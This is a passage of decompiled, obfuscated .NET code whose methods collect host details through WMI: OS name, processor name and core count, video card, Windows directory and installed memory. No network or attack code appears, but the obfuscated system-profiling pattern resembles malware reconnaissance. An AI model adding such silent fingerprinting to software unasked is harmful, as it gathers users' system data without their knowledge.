		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = "error";
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(text, "error", false) == 0)
			{
				Computer val5 = new Computer();
				return ((ServerComputer)val5).get_Info().get_OSFullName();
			}
			return text;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = "error";
			ProjectData.ClearProjectError();
			return text;
		}
	}

	public static object smethod_24()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val.Get().GetEnumerator();
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					return ((ManagementBaseObject)val2).get_Item("Name");
				}
				object result = default(object);
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_25()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val.Get().GetEnumerator();
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					return ((ManagementBaseObject)val2).get_Item("NumberOfCores");
				}
				object result = default(object);
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_26()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val.Get().GetEnumerator();
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					return ((ManagementBaseObject)val2).get_Item("Name");
				}
				object result = default(object);
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_27()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val.Get().GetEnumerator();
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					return ((ManagementBaseObject)val2).get_Item("WindowsDirectory");
				}
				object result = default(object);
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_28()
	{
		try
		{
			return Convert.ToInt32((double)((ServerComputer)Class2.Class1_0).get_Info().get_TotalPhysicalMemory() / 1048576.0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_29()
	{
		Console.ReadLine();
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private static void smethod_30(object object_0)
	{
		smethod_15((object[])object_0);
	}
}
